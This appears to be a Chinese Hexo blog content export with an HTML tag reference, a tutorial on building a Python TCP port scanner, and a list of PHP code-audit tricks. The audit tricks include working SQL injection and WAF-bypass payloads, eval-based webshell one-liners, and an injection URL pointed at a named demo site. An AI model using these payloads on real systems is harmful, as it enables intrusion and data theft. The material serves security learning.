name="" type="checkbox" value="">C</p><br><p>单选按钮 <code>type=”radio”</code> 组A:<input name="radio_a" type="radio" value="" checked="checked">① <input name="radio_a" type="radio" value="">②　　组B:<input name="radio_b" type="radio" value="" checked="checked">Ⅰ <input name="radio_b" type="radio" value="">Ⅱ</p><br><p>文件域 <code>type=”file”</code> <input name="" type="file"></p><br><p>图像域 <code>type=”image”</code> <input name="" type="image" src="http://oa8y5guqs.bkt.clouddn.com/27W58PICZS7_1024.jpg" alt="图片无法显示"><small>（可用做提交按钮）</small></p><br><p>隐藏域 <code>type=”hidden”</code> <input name="" type="hidden" value=""><small>（当然是看不见的了）</small></p><br><p>普通按钮 <code>type=”button”</code> <input name="" type="button" value="无任何作用的按钮"></p><br><p>重置按钮 <code>type=”reset”</code> <input name="" type="reset" value="重置所有控件"></p><br><p>提交按钮 <code>type=”submit”</code> <input name="" type="submit" value="提交表单用的按钮"></p>

<p>email 域 <code>type=”email”</code> <input name="" type="email"><small>（若有输入内容，则会验证格式是否符合 email）</small></p><br><p>url 域 <code>type=”url”</code> <input name="" type="url"><small>（若有输入内容，则会验证格式是否符合 url）</small></p><br><p>数值域 <code>type=”number”</code> <input name="" type="number" min="1" max="10"><small>（若有设置最大值或最小值，则会验证数字是否在最大最小值之内）</small></p><br><p>数值范围域 <code>type=”range”</code> <input name="" type="range" min="1" max="10"><small>（通过拖动滑块来选择数值）</small></p><br><p>日期域 <code>type=”date”</code> <input name="" type="date"><small>（会调用浏览器自带的日期选择器，可设置的类型：date, month, week, time, datetime, datetime-local）</small></p><br><p>　　　 <code>type=”month”</code> <input name="" type="month"></p><br><p>　　　 <code>type=”week”</code> <input name="" type="week"></p><br><p>　　　 <code>type=”time”</code> <input name="" type="time"></p><br><p>　　　 <code>type=”datetime”</code> <input name="" type="datetime"></p><br><p>　　　 <code>type=”datetime-local”</code> <input name="" type="datetime-local"></p><br><p>色值域 <code>type=”color”</code> <input name="" type="color"><small>（会调用浏览器自带的颜色选择器）</small></p><br><p>搜索域 <code>type=”search”</code> <input name="" type="search"><small>（用于搜索，站内搜索或 Google 搜索等，在输入框内容右侧通常会出现清除按钮）</small></p><br><hr><br><p><strong>&lt;datalist&gt;</strong> 定义 input 元素的选项列表</p>

<p><div><br>  <input id="myCar" list="cars"><br>  <datalist id="cars"><br>    <option value="BMW"><br>    </option><option value="Ford"><br>    </option><option value="Volvo"><br>  </option></datalist><br></div></p>
<p><hr></p>
<p><strong>&lt;keygen&gt;</strong> 定义生成秘钥<keygen name=""></p><br><hr><br><p><strong>&lt;output&gt;</strong> 定义多行的文本输入控件<output name="x" for="a b"></output></p><br><hr><br><p><strong>&lt;label&gt;</strong> 定义 input 元素的标注<input id="testid_1" name="" type="checkbox" value="1"><label for="testid_1">点击这里也可以选中</label></p><br><hr><br><p><strong>&lt;textarea&gt;</strong> 定义多行的文本输入控件</p><br><p><textarea></textarea></p><br><hr><br><p><strong>&lt;button&gt;</strong> 定义按钮<small>（与 input 不同的是，button 内部可以放置更多的内容，比如文本或图像）</small></p><br><p><br>  <button type="button">普通按钮</button><br>  <button type="reset">重置按钮</button><br>  <button type="submit">提交按钮</button><br></p><br></form><br><hr><br><h2>【格式】</h2><br><br><p><strong>&lt;blockquote&gt;</strong> 定义长的引用<small>（通常四周会有缩进）</small></p><br><blockquote>WEB标准不是某一个标准，而是一系列标准的集合。网页主要由三部分组成：结构（Structure）、表现（Presentation）和行为（Behavior）。对应的标准也分三方面：结构化标准语言主要包括XHTML和XML，表现标准语言主要包括CSS，行为标准主要包括对象模型（如W3C DOM）、ECMAScript等。这些标准大部分由W3C起草和发布，也有一些是其他标准组织制订的标准，比如ECMA（European Computer Manufacturers Association）的ECMAScript标准。<br></blockquote><br><hr><br><p><strong>&lt;pre&gt;</strong> 定义预格式文本<small>（通常会<strong>保留空格及换行符</strong>，并使用等宽字体显示，很适合用来表示计算机代码）</small></p><br><pre><br>for(var i=0; i<9; i++)="" {="" i++;="" };="" <="" pre=""><br></9;></pre><br><hr><br><p><strong>&lt;address&gt;</strong>定义文档作者或拥有者的联系信息<small>（通常使用斜体显示）</small></p><br><address><br>  <a href="mailto:joy_nick@qq.com" target="_blank" rel="external">联系我</a><br>前端开发<br></address><br><hr><br><p><strong>&lt;a&gt;</strong> 定义<a href="http://byd.dropsec.xyz/">链接</a></p><br><p><strong>&lt;em&gt;</strong> 定义<em>强调文本</em><small>（通常使用斜体显示）</small></p><br><p><strong>&lt;strong&gt;</strong> 定义<strong>更为强调的文本</strong><small>（通常使用粗体显示）</small></p><br><p><strong>&lt;mark&gt;</strong> 定义<mark>带有标记的文本</mark><small>（通常会高亮显示）</small></p><br><p><strong>&lt;time&gt;</strong> 定义<time datetime="2016-6-6">时间</time><small>（通常不会有任何视觉效果）</small></p><br><hr><br><p><strong>&lt;del&gt;</strong> 定义<del>被删除文本</del><small>（通常带有删除线）</small></p><br><p><strong>&lt;ins&gt;</strong> 定义<ins>新插入文本</ins><small>（通常带有下划线）</small></p><br><p>2016年6月6日是<del>星期五</del><ins>星期四</ins></p><br><hr><br><p><strong>&lt;i&gt;</strong> 定义<i>斜体文本</i></p><br><p><strong>&lt;b&gt;</strong> 定义<b>粗体文本</b></p><br><p><strong>&lt;big&gt;</strong> 定义<big>大号文本</big><small>（通常使用比正文更大的字号显示）</small></p><br><p><strong>&lt;small&gt;</strong> 定义<small>小号文本</small><small>（通常使用比正文更小的字号显示）</small></p><br><p><strong>&lt;sup&gt;</strong> 定义<sup>上标文本</sup>、X<sup>2</sup></p><br><p><strong>&lt;sub&gt;</strong> 定义<sub>下标文本</sub>、H<sub>2</sub>O</p><br><hr><br><p><strong>&lt;code&gt;</strong> 定义<code>计算机代码文本。This HTML Code.</code><small>（通常使用等宽字体显示，但<strong>不会保留空格及换行符</strong>，需要保留空格及换行符，请使用&lt;pre&gt;）</small><a href="http://www.w3school.com.cn/tags/tag_code.asp" target="_blank" rel="external">详细描述</a></p><br><p><strong>&lt;cite&gt;</strong> 定义<cite>引用。可使用该标签对参考文献的引用进行定义，比如书籍或杂志的标题。</cite><small>（通常使用斜体显示）</small><a href="http://www.w3school.com.cn/tags/tag_cite.asp" target="_blank" rel="external">详细描述</a></p><br><p><strong>&lt;q&gt;</strong> 定义<q>短的引用</q><small>（通常会在两边加双引号）</small></p><br><hr><br><p><strong>&lt;bdo&gt;</strong> 定义文本的方向</p><br><p>后面的文字会从右到左来显示：<bdo dir="rtl">你已经具备了倒读的能力</bdo></p><br><hr><br><p><strong>&lt;abbr&gt;</strong> 定义缩写</p><br><p>微软推出的浏览器是 <abbr title="Internet Explorer">IE</abbr> 浏览器。（鼠标移到“IE”上看效果）</p><br><hr><br><p><strong>&lt;progress&gt;</strong> 定义进度条 <progress value="22" max="100"></progress> </p><br><p><strong>&lt;meter&gt;</strong> 定义度计量 <meter value="3" min="0" max="10">十分之三</meter> <meter value="0.6">60%</meter></p><br><hr><br><h2>【图像】</h2><br><br><p><strong>&lt;img&gt;</strong> 定义图像</p><br><p><strong>&lt;map&gt;</strong> 定义可点击区域</p><br><p><strong>&lt;area&gt;</strong> 定义可点击区域的内部区域</p><br><p>图片左右两边的链接不一样：</p><br><p><img src="http://oa8y5guqs.bkt.clouddn.com/27W58PICZS7_1024.jpg" usemap="#html"></p><br><!--
圆形
shape="circle" coords="x,y,r"
x,y 为坐标（0,0是左上角），r 为圆的半径

多边形
shape="polygon"，coords="x1,y1,x2,y2,x3,y3,..."
多边形会自动封闭，不需要在结尾重复第一个坐标来关闭

矩形
shape="rectangle"，coords="x1,y1,x2,y2"
--><br><map name="html" id="html"><br>  <area shape="circle" coords="15,15,15" href="http://oa8y5guqs.bkt.clouddn.com/27W58PICZS7_1024.jpg" alt="Logo"><br>  <area shape="rectangle" coords="40,0,80,30" href="http://oa8y5guqs.bkt.clouddn.com/27W58PICZS7_1024.jpg" alt="F2E"><br></map><br><hr><br><p><strong>&lt;figure&gt;</strong> 定义文档中的媒体内容（图片、图表、照片、代码等）</p><br><p><strong>&lt;figcaption&gt;</strong> 定义 figure 元素的标题</p>

<p><figure><br>  <figcaption>媒体标题</figcaption><br>  <img src="http://oa8y5guqs.bkt.clouddn.com/27W58PICZS7_1024.jpg"><br></figure></p>
<p><hr></p>
<p></p><p><strong>&lt;canvas&gt;</strong> 定义画布<small>（此处不做演示）</small></p><p></p>
<p><hr></p>
<h2>【音频/视频】</h2>

<p></p><p><strong>&lt;audio&gt;</strong> 定义声音</p><p></p>
<p></p><p><strong>&lt;source&gt;</strong> 定义媒体源</p><p></p>
<p><audio controls="controls"><br>您的浏览器不支持 audio 标签<br></audio></p>
<p><hr></p>
<p></p><p><strong>&lt;audio&gt;</strong> 定义视频</p><p></p>
<p></p><p><strong>&lt;video&gt;</strong> 定义字幕</p><p></p>
<p><video controls="controls"><br>您的浏览器不支持 video 标签<br></video></p>
<p><hr></p>
<h2>【其他】</h2>

<p></p><p><strong>&lt;noscript&gt;</strong> 定义针对不支持客户端脚本的用户的替代内容</p><p></p>
<p><script type="text/javascript"><br>document.write(“<p>当前您的浏览器支持JavaScript脚本</p>“)<br></script></p>
<noscript>若您看到这行字，说明您的浏览器不支持JavaScript脚本</noscript>

<hr>

<p></p><p><strong>&lt;noframes&gt;</strong> 定义针对不支持框架的用户的替代内容</p><p></p>
<p><noframes>若您看到这行字，说明您的浏览器不支持运行框架</noframes></p>
<p><hr></p>
<p></p><p><strong>&lt;ruby&gt;</strong> 定义 ruby 注释</p><p></p>
<p></p><p><strong>&lt;rt&gt;</strong> 定义 ruby 注释的解释</p><p></p>
<p></p><p><strong>&lt;rp&gt;</strong> 定义若浏览器不支持 ruby 元素显示的内容</p><br><ruby><br>漢 <rt><rp>(</rp>ㄏㄢˋ<rp>)</rp></rt><br></ruby><p></p>
]]></content>
      
        
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 编程 </tag>
            
            <tag> HTML </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python实现端口扫描]]></title>
      <url>/2016/08/24/Python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
      <content type="html"><![CDATA[<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><font color="#000FF">端口扫描工具（Port Scanner）指用于探测服务器或主机开放端口情况的工具。常被计算机管理员用于确认安全策略，同时被攻击者用于识别目标主机上的可运作的网络服务。</font><br><a id="more"></a><br><font color="#000FF">端口扫描定义是客户端向一定范围的服务器端口发送对应请求，以此确认可使用的端口。虽然其本身并不是恶意的网络活动，但也是网络攻击者探测目标主机服务，以利用该服务的已知漏洞的重要手段。端口扫描的主要用途仍然只是确认远程机器某个服务的可用性。<br><br>扫描多个主机以获取特定的某个端口被称为端口清扫（Portsweep），以此获取特定的服务。例如，基于SQL服务的计算机蠕虫就会清扫大量主机的同一端口以在 1433 端口上建立TCP连接。</font>

<h1 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h1><font color="#000ff">最简单的端口扫描工具使用TCP连接扫描的方式，即利用操作系统原生的网络功能，且通常作为SYN扫描的替代选项。Nmap将这种模式称为连接扫描，因为使用了类似Unix系统的connect()命令。如果该端口是开放的，操作系统就能完成TCP三次握手，然后端口扫描工具会立即关闭刚建立的该连接，防止拒绝服务攻击。这种扫描模式的优势是用户无需特殊权限。但使用操作系统原生网络功能不能实现底层控制，因此这种扫描方式并不流行。并且TCP扫描很容易被发现，尤其作为端口清扫的手段：这些服务会记录发送者的IP地址，入侵检测系统可能触发警报。<br><br>还有另外一种扫描方式是SYN扫描，端口扫描工具不使用操作系统原生网络功能，而是自行生成、发送IP数据包，并监控其回应。这种扫描模式被称为“半开放扫描”，因为它从不建立完整的TCP连接。端口扫描工具生成一个SYN包，如果目标端口开放，则会返回SYN-ACK包。扫描端回应一个RST包，然后在握手完成前关闭连接。如果端口关闭了但未使用过滤，目标端口应该会持续返回RST包。这种粗略的网络利用方式有几个优点：给扫描工具全权控制数据包发送和等待回应时长的权力，允许更详细的回应分析。关于哪一种对目标主机的扫描方式更不具备入侵性存在一些争议，但SYN扫描的优势是从不会建立完整的连接。然而，RST包可能导致网络堵塞，尤其是一些简单如打印机之类的网络设备。<br><br>此次使用的是第一种扫描方式，直接利用操作系统的socket连接接口，初步测试目标服务器的端口是否可以连接，如果可以则返回端口打开状态</font>

<h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><p>可以把程序分成下面几部分：</p>
<pre><code>1.读取端口及目标服务器
2.测试TCP端口连接
3.输出开放端口结果
</code></pre><h3 id="1-读取端口及目标服务器"><a href="#1-读取端口及目标服务器" class="headerlink" title="1.读取端口及目标服务器"></a>1.读取端口及目标服务器</h3><font color="#000ff">直接把目标服务器和端口范围作为参数传给我们的程序，程序运行参数：</font>

<blockquote>
<p>python port_scan.py <host\> <start\_port>-<end\_port></end\_port></start\_port></host\></p>
</blockquote>
<p>程序中使用sys.argv[]来读取并初步处理,具体的语法请参考<a href="http://www.360doc.com/content/11/0530/12/54470_120450746.shtml" target="_blank" rel="external">python sys.argv[]用法</a>：</p>
<pre><code>#!/usr/bin/python
# -*- coding: UTF-8 -*-
&apos;&apos;&apos;
@Author：joy_nick
@博客：http://byd.dropsec.xyz/
&apos;&apos;&apos;
import sys

# portscan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt;
host = sys.argv[1]
portstrs = sys.argv[2].split(&apos;-&apos;)

start_port = int(portstrs[0])
end_port = int(portstrs[1])
</code></pre><h3 id="2-测试TCP端口连接"><a href="#2-测试TCP端口连接" class="headerlink" title="2.测试TCP端口连接"></a>2.测试TCP端口连接</h3><p>我们进入到一个循环，在这个循环中依次对端口范围内的端口进行连接测试。</p>
<font color="#000ff">首先要在文件开始部分引入 socket 包：</font>

<blockquote>
<p>from socket import *</p>
</blockquote>
<p>连接测试方法是：</p>
<pre><code>创建socket
调用connect()函数
关闭连接
</code></pre><p>依次实现如下：</p>
<font color="#000ff">获取目标IP地址：</font>

<blockquote>
<p>target_ip = gethostbyname(host)</p>
</blockquote>
<font color="#000ff">进入循环开始连接：</font>

<pre><code>opened_ports = []

for port in range(start_port, end_port + 1):
    sock = socket(AF_INET, SOCK_STREAM)
    sock.settimeout(10)
    result = sock.connect_ex((target_ip, port))
    if result == 0:
        opened_ports.append(port)
</code></pre><p><strong>附：</strong></p>
<p>1.<a href="http://baike.baidu.com/link?url=t3aTQ0VIR87LP2zNAiDwYi7yrHfRJ_myvW_peE1GGidV0N_DId-8wVdn2yb_lICJupshiQl3ZHjgeL89imMN9K" target="_blank" rel="external">Python socket()介绍及使用方法</a></p>
<p>2.<a href="http://blog.sina.com.cn/s/blog_523491650100hikg.html" target="_blank" rel="external">Python socket编程</a></p>
<h3 id="3-输出开放端口结果"><a href="#3-输出开放端口结果" class="headerlink" title="3.输出开放端口结果"></a>3.输出开放端口结果</h3><p>这一步骤很简单，只需要打印opened_ports列表：</p>
<pre><code>print(&quot;Opened ports:&quot;)

for i in opened_ports:
    print(i)
</code></pre><p>完整的代码如下：</p>
<pre><code>#!/usr/bin/python
# -*- coding: utf-8 -*-
&apos;&apos;&apos;
@Author：joy_nick
@博客：http://byd.dropsec.xyz/
&apos;&apos;&apos;
import sys
from socket import *

# port_scan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt;
host = sys.argv[1]
portstrs = sys.argv[2].split(&apos;-&apos;)

start_port = int(portstrs[0])
end_port = int(portstrs[1])

target_ip = gethostbyname(host)
opened_ports = []

for port in range(start_port, end_port):
    sock = socket(AF_INET, SOCK_STREAM)
    sock.settimeout(10)
    result = sock.connect_ex((target_ip, port))
    if result == 0:
        opened_ports.append(port)

print(&quot;Opened ports:&quot;)

for i in opened_ports:
    print(i)
</code></pre><h1 id="执行测试"><a href="#执行测试" class="headerlink" title="执行测试"></a>执行测试</h1><p>命令为：</p>
<blockquote>
<p>python port_scan.py 192.168.1.200 21-23</p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/port_scan1.png" alt=""></p>
<h1 id="多线程端口扫描器"><a href="#多线程端口扫描器" class="headerlink" title="多线程端口扫描器"></a>多线程端口扫描器</h1><p>上面的简单程序中，我们依次测试每个端口，如果要提高性能，可以考虑采用多线程的方式。</p>
<p>改进的方式如下：</p>
<pre><code>1.把TCP连接测试封装进函数
2.每次循环都创建一个线程来执行1中的扫描函数
3.为了简化实现，把开放端口输出步骤写入到1的测试函数中
</code></pre><font color="#000ff">首先引入thread包，这个包是Python多线程实现需要的：</font>

<blockquote>
<p>import thread</p>
</blockquote>
<p>实现TCP测试函数，需要注意print输出时候需要加锁，如果不加锁可能会出现多个输出混合在一起的错误状态，而锁需要在程序启动时创建，从而能让新建的线程共享这个锁：</p>
<pre><code>def tcp_test(port):
    sock = socket(AF_INET, SOCK_STREAM)
    sock.settimeout(10)
    result = sock.connect_ex((target_ip, port))
    if result == 0:
        lock.acquire()
        print &quot;Opened Port:&quot;,port
        lock.release()
</code></pre><p><strong>附：</strong></p>
<p>1.<a href="http://orangeholic.iteye.com/blog/1720421" target="_blank" rel="external">Python的锁</a></p>
<p>2.<a href="http://www.oschina.net/question/197184_79369" target="_blank" rel="external">多线程lock.acquire()</a></p>
<p>注意当输出执行完后要释放锁lock。</p>
<p>输入的处理及lock的创建可以放在main函数中：</p>
<pre><code>if __name__==&apos;__main__&apos;:
    # portscan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt;
    host = sys.argv[1]
    portstrs = sys.argv[2].split(&apos;-&apos;)

    start_port = int(portstrs[0])
    end_port = int(portstrs[1])

    target_ip = gethostbyname(host)

    lock = thread.allocate_lock()
</code></pre><font color="#000ff">然后修改for循环：</font>

<pre><code>for port in range(start_port, end_port):
    thread.start_new_thread(tcp_test, (port,))
</code></pre><p><code>thread.start_new_thread</code> 用来创建一个线程，该函数的第一个参数是一个线程中执行的函数，第二个参数必须是个元组，作为函数的输入，由于 <code>tcp\_test</code> 函数只有一个参数，所以我们使用<code>(port,)</code>这种形式表示这个参数为元组。</p>
<p><strong>thread.start_new_thread参考资料如下：</strong></p>
<p>这个是<code>thread.start_new_thread(function,args[,kwargs])</code>函数原型，其中function参数是你将要调用的线程函数；args是讲传递给你的线程函数的参数，它必须是个tuple类型（元组）；而kwargs是可选的参数。线程的结束一般依靠线程函数的自然结束；也可以在线程函数中调用thread.exit()，它抛出SystemExit exception，达到退出线程的目的。</p>
<p>这里运行程序会报错：</p>
<pre><code>Unhandled exception in thread started by 
sys.excepthook is missing 
lost sys.stderr 
</code></pre><p>网上解释为：</p>
<font color="#000ff">第一个问题：因为主进程已经结束，相关的资源已经释放，而线程还在后台运行，所以会导致线程找不到相关的资源和定义<br><br>第二个问题：因为主程序结束的时候，并没有等待子线程结束，也没有强制关闭子线程，因此还在后台运行，有两个办法可以让他们同时结束，一个办法是在在构建进程的时候增加参数 deamon=True, 第二个办法就是在程序最后增加thread1.join(),thread2.join()</font>

<p>但是并没有什么卵用，我的解决办法为：</p>
<p>在主函数上加里一个<code>time.sleep(1)</code></p>
<p>完整的程序代码如下：</p>
<pre><code>#!/usr/bin/python
# -*- coding: UTF-8 -*-
&apos;&apos;&apos;
@Author：joy_nick
@博客：http://byd.dropsec.xyz/
&apos;&apos;&apos;
import sys
import thread
from socket import *

def tcp_test(port):
    sock = socket(AF_INET, SOCK_STREAM)
    sock.settimeout(10)
    result = sock.connect_ex((target_ip, port))
    if result == 0:
        lock.acquire()
        print &apos;主机:%s&apos;%(target_ip)
        print &quot;开放的端口为:&quot;,port
        print &apos;\n&apos;
        lock.release()
        thread.exit()

if __name__==&apos;__main__&apos;:
    # portscan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt;
    host = sys.argv[1]
    portstrs = sys.argv[2].split(&apos;-&apos;)

    start_port = int(portstrs[0])
    end_port = int(portstrs[1])

    target_ip = gethostbyname(host)

    lock = thread.allocate_lock()

    for port in range(start_port, end_port):
        thread.start_new_thread(tcp_test, (port,))
        time.sleep(1)
</code></pre><p>运行实例如下：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/port_scan2.png" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> Python </tag>
            
            <tag> 自动化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP代码审计技巧]]></title>
      <url>/2016/08/23/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/</url>
      <content type="html"><![CDATA[<p>1、<font color="#0000FF">$_SERVER[‘PHP_SELF’]和$_SERVER[‘QUERY_STRING’]，而$_SERVER并没有转义，造成了注入。</font></p>
<p>例如：</p>
<pre><code>/easy/index.php/aaa&apos;,(select/**/if((select/**/ord(substr(user(),1,1)))=114,sleep(3),0)),1)#
</code></pre><a id="more"></a>
<p>2、<font color="#0000FF">update更新时没有重构更新序列，导致更新其他关键字段</font></p>
<p>例如：</p>
<blockquote>
<p>id=1&amp;data=1991-03-16&amp;money=10000000</p>
</blockquote>
<p>3、<font color="#0000FF">在 php中 如果使用了一个未定义的常量，PHP 假定想要的是该常量本身的名字，如同用字符串调用它一样（CONSTANT 对应 “CONSTANT”）。此时将发出一个 E_NOTICE 级的错误（参考<a href="http://php.net/manual/zh/language.constants.syntax.php）" target="_blank" rel="external">http://php.net/manual/zh/language.constants.syntax.php）</a></font></p>
<p>例如：</p>
<blockquote>
<p>未定义常量if(IN_ADMIN != TRUE) 等式不成立，非0、null都为true</p>
</blockquote>
<p>4、<font color="#0000FF">PHP中自编写对标签的过滤或关键字过滤，应放在strip_tags等去除函数之后，否则引起过滤绕过。</font></p>
<p>例如：</p>
<pre><code>function mystrip_tags($string)
{
$string = remove_xss($string);
$string = new_html_special_chars($string);
$string = strip_tags($string);//remove_xss在strip_tags之前调用，所以很明显可以利用strip_tags函数绕过,在关键字中插入html标记.
return $string;
}
</code></pre><p>对关键字过滤之后存在字符替换、html去除等操作可构造多余字符绕过。</p>
<p>例如：提交</p>
<pre><code>user/**/W&lt;a&gt;HERE/**/IF((S&lt;a&gt;ELECT/**/A&lt;a&gt;SCII(S&lt;a&gt;UBSTRING(PASSWORD,1,1))F&lt;a&gt;ROM/**/ts_user/**/L&lt;a&gt;IMIT 1)=101,1=S&lt;a&gt;LEEP(2.02),0)%23
</code></pre><p>由于全局关键字过滤之后存在strip_tags()函数可绕过。</p>
<p>5、<font color="#0000FF">当可控变量进入双引号中时可形成webshell</font></p>
<p>例如：</p>
<pre><code>$a = &quot;${@eval($_POST[s])}&quot;;
$a = &quot;${${eval($_POST[s])}}&quot;;
</code></pre><p>因此代码执行使用${file_put_contents($_GET[f],$_GET[p])}可以生成webshell。</p>
<p>6、<font color="#0000FF">宽字节转编码过程中出现宽字节注入</font></p>
<blockquote>
<p>例如：测试输入 <code>%e5%5c%5c&#39;</code> 两个<code>\\&#39;</code>则单引号出来</p>
</blockquote>
<p>7、<font color="#0000FF">构造查询语句时无法删除目标表中不存在字段时可使用mysql多表查询绕过。</font></p>
<p>例如：</p>
<blockquote>
<p>select uid,password from users,admins；<br>(uid存在于users、password存在于admins）</p>
</blockquote>
<p>8、<font color="#0000FF">mysql中（反引号）能作为注释符，且会自动闭合末尾没有闭合的反引号。无法使用注释符的情况下使用别名as+反引号可闭合其后语句。</font></p>
<p>例如：</p>
<blockquote>
<p>select <code>username</code>,<code>password</code> from pre_common_statuser as ` as statistic from common_stat where uid=1</p>
</blockquote>
<p>此处（password from pre_common_statuser as ）为注入语句，使用别名as与自带无视其后语句。</p>
<p>9、<font color="#0000FF">mysql的类型强制转换可绕过PHP中empty()函数对0的false返回。</font></p>
<blockquote>
<p>例如：提交/?test=0axxx    -&gt; empty($_GET[‘test’]) =&gt; 返回真</p>
</blockquote>
<p>10、<font color="#0000FF">存在全局过滤时观察过滤条件是否有if判断进入，cms可能存在自定义safekey不启用全局过滤。通过程序遗留或者原有界面输出safekey导致绕过。<font></font></font></p>
<p>例如：</p>
<pre><code>if($config[&apos;sy_istemplate&apos;]!=&apos;1&apos; || md5(md5($config[&apos;sy_safekey&apos;]).$_GET[&apos;m&apos;])!=$_POST[&apos;safekey&apos;])
{
foreach($_POST as $id=&gt;$v){
safesql($id,$v,&quot;POST&quot;,$config);
$id = sfkeyword($id,$config);
$v = sfkeyword($v,$config);
$_POST[$id]=common_htmlspecialchars($v);
}
}
</code></pre><p>11、<font color="#0000FF">由于全局过滤存在白名单限定功能，可使用无用参数带入绕过。</font><br>例如：</p>
<blockquote>
<p>if ($webscan_switch&amp;&amp;webscan_white($webscan_white_directory,$webscan_white_url))</p>
</blockquote>
<p>其中具体过滤代码如下：</p>
<p>//后台白名单,后台操作将不会拦截,添加”|”隔开白名单目录下面默认是网址带 admin /dede/ 放行</p>
<blockquote>
<p>$webscan_white_directory=’admin|/dede\/|/install/‘;</p>
</blockquote>
<p>//url白名单,可以自定义添加url白名单,默认是对phpcms的后台url放行</p>
<p>//写法：比如phpcms 后台操作url index.php?m=admin php168的文章提交链接post.php?job=postnew&amp;step=post ,dedecms 空间设置edit_space_info.php</p>
<blockquote>
<p>$webscan_white_url = array(‘index.php’ =&gt; ‘admin_dir=admin’,’post.php’ =&gt; ‘job=postnew&amp;step=post’,’edit_space_info.php’=&gt;’’);</p>
</blockquote>
<p>只要让传入参数存在白名单目录或参数即可绕过。</p>
<p><strong>利用白名单目录：</strong></p>
<blockquote>
<p><a href="http://www.target.com/index.php/dede/?m=foo&amp;c=bar&amp;id=1" target="_blank" rel="external">http://www.target.com/index.php/dede/?m=foo&amp;c=bar&amp;id=1</a>‘ and 1=2 union select xxx</p>
</blockquote>
<p>由于请求中包含了白名单目录/dede/，所以放行。</p>
<p><strong>利用白名单参数：</strong></p>
<blockquote>
<p><a href="http://www.target.com/index.php?m=foo&amp;c=bar&amp;admin_dir=admin&amp;id=1" target="_blank" rel="external">http://www.target.com/index.php?m=foo&amp;c=bar&amp;admin_dir=admin&amp;id=1</a>‘ and 1=2 union select xxx</p>
</blockquote>
<p>请求中包含了白名单参数所以放行。</p>
<p>12、<font color="#0000FF">字符串截断函数获取定长数据，截取\或\’前一位，闭合语句。<br>利用条件必须是存在两个可控参数，前闭合，后注入。</font><br>例如：</p>
<pre><code>if (strlen($u_email)&gt;32) { $u_email = substring($u_email,32);}
if (strlen($u_qq)&gt;16) { $u_qq = substring($u_qq,16);}
if (strlen($u_phone)&gt;16) { $u_phone = substring($u_phone,16);}
$u_phone=123456789012345\ 带入：
UPDATE mac_user SET u_qq=&apos;$u_qq&apos;,u_email=&apos;$u_email&apos;,u_phone=&apos;123456789012345\&apos;,u_question=&apos;$u_question&apos;,u_answer=&apos;$u_answer&apos;,u_password=&apos;$u_password&apos; WHERE u_id=1
</code></pre><p>13、<font color="#0000FF">过滤了空格，逗号的注入，可使用括号包裹绕过。具体如遇到select from（关键字空格判断的正则，且剔除/**/等）可使用括号包裹查询字段绕过。</font><br>例如：</p>
<blockquote>
<p>select(user)from(website);</p>
</blockquote>
<p>另外一种方式：</p>
<pre><code>select{x table_name}from{x information_schema.tables}
select{x(name)}from{x(manager)};
select{wooyun&apos;zone&apos;}from{mysql.user}
select{x+table_name}from{x(information_schema.tables)}
</code></pre><p>14、<font color="#0000FF">由于PHP弱类型验证机制，导致==、in_array()等可通过强制转换绕过验证。</font><br>例如：</p>
<blockquote>
<p>in_array($_GET[‘x’],array(1,2,3,4,5))</p>
</blockquote>
<p>访问<code>?test=’1’testtest</code>可判断成功。</p>
<p>15、<font color="#0000FF">WAF或者过滤了and|or的情况可以使用&amp;&amp;与||进行盲注。</font></p>
<pre><code>FALSE的情况：
1 || 0
TRUE的情况：
1 || 1
</code></pre><p>例如：</p>
<blockquote>
<p><a href="http://demo.74cms.com/user/user\_invited.php?id=1%20||%20strcmp(substr(user(),1,13),char(114,111,111,116,64,108,111,99,97,108,104,111,115,116))&amp;act=invited" target="_blank" rel="external">http://demo.74cms.com/user/user\_invited.php?id=1%20||%20strcmp(substr(user(),1,13),char(114,111,111,116,64,108,111,99,97,108,104,111,115,116))&amp;act=invited</a></p>
</blockquote>
<p>16、<font color="#0000FF">windows下php中访问文件名使用”&lt;” “&gt;”将会被替换成”*” “?”，分别代表N个任意字符与1个任意字符。</font><br>例如：</p>
<blockquote>
<p>file_get_contents(“/images/“.$_GET[‘a’].”.jpg”);</p>
</blockquote>
<p>可使用test.php?a=../a&lt;%00访问对应php文件。</p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> WAF绕过 </tag>
            
            <tag> PHP </tag>
            
            <tag> webshell </tag>
            
            <tag> MySQL </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[《代码审计》读书笔记]]></title>
      <url>/2016/08/18/%E3%80%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p><strong>PHP核心配置文件</strong>：</p>
<p>1.register_globals=Off(全局变量注册开关)</p>
<p>2.allow_url_include=Off(是否允许包含远程文件)与此类似的还有allow_url_fopen</p>
<a id="more"></a>
<p>3.magic_quotes_gpc=On(魔术引号自动过滤)会自动在单引号、双引号、反斜杠、空字节(NULL)的前面加上反斜,但是在PHP5中不会过滤$SERVER变量所以可以利用client-ip、referer等漏洞</p>
